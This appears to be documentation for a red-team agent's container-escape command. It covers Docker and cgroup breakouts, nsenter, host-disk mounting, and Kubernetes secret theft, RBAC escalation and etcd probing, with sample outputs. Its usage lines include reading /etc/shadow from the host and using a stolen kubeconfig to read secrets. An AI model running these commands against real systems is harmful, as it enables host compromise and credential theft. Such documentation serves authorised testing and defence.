+++
title = "container-escape"
chapter = false
weight = 100
hidden = false
+++

{{% notice info %}}Linux Only{{% /notice %}}

## Summary

Container escape and Kubernetes operations — enumerate and exploit breakout vectors for escaping Docker, Kubernetes, and other container runtimes. Includes K8s API operations for pod enumeration, secret access, pod deployment, and remote execution. Supports Docker socket abuse, cgroup release_agent, PID namespace nsenter, host block device mounting, and full K8s API interaction.

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | No | check | Escape technique or K8s operation |
| command | No | — | Command to execute, secret name, or 'podname command' for k8s-exec |
| image | No | alpine | Container image for docker-sock/k8s-deploy/k8s-exec |
| path | No | auto-detect | Block device path for mount-host; namespace override for K8s actions (`k8s-rbac` accepts `<ns>`, `<ns1,ns2,...>`, or `*` for every namespace) |
| kubeconfig | No | — | Path to kubeconfig file for out-of-cluster K8s access. Supports bearer token and client certificate auth. If empty, uses in-cluster service account |

### Actions

**Container Escape:**
- **check** — Enumerate all available escape vectors without exploiting them
- **docker-sock** — Exploit mounted Docker socket to run a privileged container with host filesystem access
- **cgroup** — Use cgroup release_agent to execute commands on the host (requires privileged container)
- **nsenter** — Enter host PID namespace via nsenter to run commands as host root
- **mount-host** — Mount host block device to read host filesystem (requires CAP_SYS_ADMIN)

**Kubernetes Operations (T1610, T1613, T1552.007, T1069.003, T1087.004):**
- **k8s-enum** — Discover K8s API server, enumerate namespaces, pods, and services
- **k8s-secrets** — List and read Kubernetes secrets (T1552.007). Use `-command <name>` to read a specific secret. When a secret is read, credential-shaped keys (password, token, apikey, JWT-shaped values, `.dockerconfigjson`, `kubeconfig`, `service-account.json`, `tls.key`, ssh private keys) are automatically registered to the Mythic credential vault — visible/usable from cred-check, find-admin, and other lateral-movement commands
- **k8s-rbac** — Enumerate ClusterRoles, ClusterRoleBindings, Roles, and RoleBindings; cross-reference subjects against rules to surface privilege-escalation paths (T1069.003). Findings are scored crit/warn/info — `cluster-admin` bindings, `system:masters` membership, wildcard verbs, `escalate`/`bind` on (cluster)roles, `impersonate` on serviceaccounts, and `mint tokens for any service account` are crit. Use `-path <ns>` for a single namespace, `<ns1,ns2,...>` for a list, or `*` for every namespace
- **k8s-nodes** — Enumerate cluster nodes via `/api/v1/nodes`. Surfaces kubelet version, OS image, kernel version (CVE/LPE hunt), pod CIDRs, taints, labels (control-plane vs worker roles), internal/external IPs, container runtime, and allocatable CPU/memory/pods (T1087.004)
- **k8s-etcd** — Discover etcd client endpoints by inspecting `kube-system` control-plane pod specs (extracts `--etcd-servers` from kube-apiserver, `--listen-client-urls` / `--advertise-client-urls` from the etcd pod). Augments the list with the usual loopback + apiserver-host fallbacks, then issues an unauthenticated `GET /version` against each endpoint and classifies the result as `unauth` (anonymous read accepted — full cluster compromise), `auth-required`, `tls-required`, `unreachable`, or `error`. Use `-path <namespace>` to override the default `kube-system` lookup
- **k8s-deploy** — Create a pod with host filesystem mount and execute commands
- **k8s-exec** — Run a command in an existing pod's context via ephemeral pod with same service account

## Usage

```
container-escape
container-escape -action check
container-escape -action docker-sock -command "cat /etc/shadow"
container-escape -action nsenter -command "id && hostname"
container-escape -action mount-host -path /dev/sda1
```

### Example Output (check)

```
=== CONTAINER ESCAPE VECTOR CHECK ===

[!] Docker socket: /var/run/docker.sock (mode: srw-rw----) — WRITABLE
    Use: container-escape -action docker-sock -command '<cmd>'

[!] Full capabilities detected — likely PRIVILEGED container
[!] Cgroup path: /docker/abc123... — release_agent escape may be possible
    Use: container-escape -action cgroup -command '<cmd>'

[*] PID namespace: container=pid:[4026532198], host=pid:[4026531836] (isolated)
[!] Host block device accessible: /dev/sda
    Use: container-escape -action mount-host -path /dev/sda

[!] K8s service account token found: eyJhbGciOiJSUzI1NiIsImtpZCI6...
    Potential for K8s API abuse (pod creation, secret access)

=== 4 escape vector(s) identified ===
```

### Kubernetes Operations

```
# Enumerate pods, services, namespaces
container-escape -action k8s-enum

# Enumerate a specific namespace
container-escape -action k8s-enum -path kube-system

# List secrets in current namespace
container-escape -action k8s-secrets

# Read a specific secret
container-escape -action k8s-secrets -command my-secret-name

# RBAC privesc paths (default = current namespace + cluster-scoped objects)
container-escape -action k8s-rbac

# RBAC analysis across multiple namespaces
container-escape -action k8s-rbac -path kube-system,prod,ci

# RBAC analysis across every reachable namespace
container-escape -action k8s-rbac -path "*"

# Cluster node attack-surface enumeration
container-escape -action k8s-nodes

# Discover etcd endpoints and probe for unauthenticated access
container-escape -action k8s-etcd

# Probe etcd in a non-standard namespace
container-escape -action k8s-etcd -path my-etcd-ns

# Deploy a pod with host filesystem mount
container-escape -action k8s-deploy -command "cat /hostfs/etc/shadow" -image alpine

# Run a command in an existing pod's context
container-escape -action k8s-exec -command "nginx-pod-abc123 id"
```

K8s operations use either in-cluster service account auth (auto-detected from `/var/run/secrets/kubernetes.io/serviceaccount/`) or an explicit kubeconfig file via `-kubeconfig`. All API calls use the authenticated identity's RBAC permissions. Use `k8s-enum` first to assess available access; `k8s-rbac` then maps the privilege landscape and `k8s-nodes` identifies the underlying hosts.

### Out-of-Cluster Access (kubeconfig)

When running outside a Kubernetes cluster (e.g., on a compromised Linux host with a stolen `~/.kube/config`), use the `-kubeconfig` flag to access the K8s API remotely:

```
# Use a stolen kubeconfig for K8s enumeration
container-escape -action k8s-enum -kubeconfig /home/user/.kube/config

# Read secrets using a kubeconfig with admin access
container-escape -action k8s-secrets -command database-creds -kubeconfig /tmp/stolen-kubeconfig

# Scan RBAC across all namespaces
container-escape -action k8s-rbac -path "*" -kubeconfig /home/user/.kube/config
```

Supported kubeconfig authentication modes:
- **Bearer token** — most common for service account tokens
- **Client certificate** — mTLS with inline base64 or file-referenced PEM certs
- **CA verification** — inline base64 or file-referenced CA certs; `insecure-skip-tls-verify` honored

Not supported: `exec`-based auth (e.g., `aws eks get-token`). Extract the token manually and set it in the kubeconfig's `user.token` field.

### Example Output (k8s-rbac)

```
=== KUBERNETES RBAC ENUMERATION ===

API Server: https://10.0.0.1:6443
Current SA Namespace: default

--- Counts ---
  ClusterRoles loaded:        78
  Namespaced Roles loaded:    14
  Bindings analysed:          63

--- Privilege Escalation Findings (3) ---
  [CRIT] ServiceAccount/robot@kube-system
        via ClusterRoleBinding/admin-bind → ClusterRole/cluster-admin
        binds subject to cluster-admin (root-equivalent)
  [CRIT] User/build@globetech.biz
        via ClusterRoleBinding/role-escalator → ClusterRole/role-editor
        escalate or bind cluster-roles (grant cluster-admin to yourself)
  [WARN] ServiceAccount/build-bot@ci
        via ClusterRoleBinding/ci-deployer → ClusterRole/deployer
        create/modify pods (run arbitrary containers, optionally privileged or hostPath-mounted)
```

### Example Output (k8s-nodes)

```
=== KUBERNETES NODE ENUMERATION ===

API Server: https://10.0.0.1:6443
Nodes:      3

[*] node-01
    Roles:        control-plane,master
    Ready:        True
    InternalIP:   10.0.0.11
    PodCIDR:      10.244.0.0/24
    Kubelet:      v1.29.3
    OS:           Ubuntu 22.04.4 LTS
    Kernel:       5.15.0-105-generic
    Runtime:      containerd://1.7.13
    Arch:         amd64
    Allocatable:  cpu=4 mem=8049052Ki pods=110
    Taints:       node-role.kubernetes.io/control-plane:NoSchedule

[*] node-02
    Roles:        worker
    Ready:        True
    InternalIP:   10.0.0.12
    PodCIDR:      10.244.1.0/24
    Kubelet:      v1.29.3
    OS:           Ubuntu 22.04.4 LTS
    Kernel:       5.15.0-105-generic
    Runtime:      containerd://1.7.13
    Arch:         amd64
    Allocatable:  cpu=8 mem=16097600Ki pods=110
```

### Example Output (k8s-etcd)

```
=== KUBERNETES ETCD ENUMERATION ===

API Server:        https://10.0.0.1:6443
Inspected NS:      kube-system
Endpoints to probe: 4

--- Discovered Endpoints ---
  https://10.0.0.11:2379           (source: etcd-pod/etcd-cp01)
  https://127.0.0.1:2379           (source: kube-apiserver/kube-apiserver-cp01/--etcd-servers)
  http://127.0.0.1:2379            (source: default/loopback-http)
  https://10.0.0.1:2379            (source: default/apiserver-host)

--- Probe Results ---
  [UNAUTH] http://127.0.0.1:2379
        etcdserver=3.5.10 cluster=3.5.0
  [TLS-REQUIRED] https://10.0.0.11:2379
        remote error: tls: bad certificate
  [TLS-REQUIRED] https://127.0.0.1:2379
        remote error: tls: bad certificate
  [UNREACHABLE] https://10.0.0.1:2379
        dial tcp 10.0.0.1:2379: connect: connection refused

--- Summary ---
  Unauthenticated reads: 1 / 4 endpoint(s)
  [!] Unauthenticated etcd access enables full cluster compromise — every secret, every config, every account token is readable. Suggested follow-up: etcdctl --endpoints=<url> get / --prefix --keys-only
```

The probe never sends any authentication material to etcd. Endpoint TLS validation is disabled (we want to surface auth posture, not certificate-issuer chain problems), so a self-signed control-plane cert is not a barrier — but the etcd server's own `--client-cert-auth=true` flag (the kubeadm default) makes the handshake fail without a client cert, which the probe reports as `tls-required`. A `unauth` result means the operator's etcd has client-cert auth disabled, and the keyspace is open to anyone who can reach :2379.

## MITRE ATT&CK Mapping

| Technique ID | Name |
|--------------|------|
| T1611 | Escape to Host |
| T1610 | Deploy Container |
| T1613 | Container and Resource Discovery |
| T1552.007 | Unsecured Credentials: Container API |
| T1069.003 | Permission Groups Discovery: Cloud Groups |
| T1087.004 | Account Discovery: Cloud Account |
